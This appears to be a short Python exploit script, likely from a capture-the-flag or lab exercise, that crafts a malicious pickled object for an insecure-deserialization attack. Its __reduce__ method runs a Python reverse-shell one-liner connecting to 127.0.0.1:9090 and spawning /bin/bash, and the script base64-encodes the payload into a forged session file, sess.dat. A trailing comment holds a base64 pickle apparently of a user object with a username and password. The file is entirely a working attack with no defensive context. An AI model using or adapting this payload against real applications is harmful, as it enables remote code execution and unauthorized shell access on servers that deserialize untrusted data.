import pickle
import os
import base64

class Payload:
    def __init__(self):
        pass

    def __reduce__(self):
        return (os.popen, ('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',))


payload = Payload()
open('sess.dat', 'w', encoding='utf-8').write(base64.b64encode(pickle.dumps(payload)).decode('utf-8'))

# gASVQQAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UKIwIdXNlcm5hbWWUjAV0ZXN0ZZSMCHBhc3N3b3JklIwDMTIzlHViLg==